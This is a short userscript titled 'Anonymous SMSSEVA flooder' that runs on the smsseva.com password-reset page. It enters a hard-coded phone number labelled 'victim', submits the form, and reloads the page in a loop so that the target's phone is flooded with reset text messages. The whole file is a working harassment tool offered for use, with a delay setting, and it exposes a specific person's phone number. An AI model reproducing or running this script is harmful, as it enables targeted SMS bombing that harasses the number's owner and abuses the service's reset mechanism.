// ==UserScript==
// @name          Anonymous SMSSEVA flooder
// @namespace     SUNNY020
// @description   flooder sms
// @include       http://*smsseva.com/*
// @credits       One
// ==/UserScript==

var victim=8092262928 //
var delay=1000; // Enter delay in milliseconds if required

if(document.location=="http://www.smsseva.com/forgot.aspx"||document.location=="http://www.smsseva.com/forgot.aspx")
{
document.getElementById('txtmobile').value=victim;
document.getElementById('btnsubmit').click();
}
if(document.location=="http://www.smsseva.com/forgot.aspx"||document.location=="http://www.smsseva.com/forgot.aspx")
setTimeout("document.location='http://www.smsseva.com/forgot.aspx'",delay);
